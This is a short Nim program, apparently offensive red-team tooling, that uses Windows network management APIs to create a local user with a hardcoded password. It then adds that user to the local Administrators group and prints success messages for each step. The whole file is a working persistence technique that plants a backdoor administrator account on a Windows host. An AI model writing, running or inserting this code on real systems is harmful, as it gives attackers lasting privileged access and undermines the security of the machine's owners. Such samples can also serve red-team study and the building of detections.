import winim/lean
import winim/inc/lm

var userInfos = USER_INFO_1(
    usri1_name: "test123",
    usri1_password: "TestPass123@",
    usri1_priv: USER_PRIV_USER,
    usri1_flags: UF_SCRIPT
  )

var account = LOCALGROUP_MEMBERS_INFO_3(
    lgrmi3_domainandname: userInfos.usri1_name
  )

var dwError = DWORD 0
var retVal = NetUserAdd(nil, 1, cast[LPBYTE](&userInfos), &dwError)
if retVal != NERR_Success:
  echo retVal
else:
  echo "[+]User Add Successful !!!"

var fiVal = NetLocalGroupAddMembers(nil, "Administrators", 3, cast[LPBYTE](&account), 1)
if fiVal != NERR_Success:
  echo fiVal
else:
  echo "[+]User Add to Administrator Group Successful !!!"
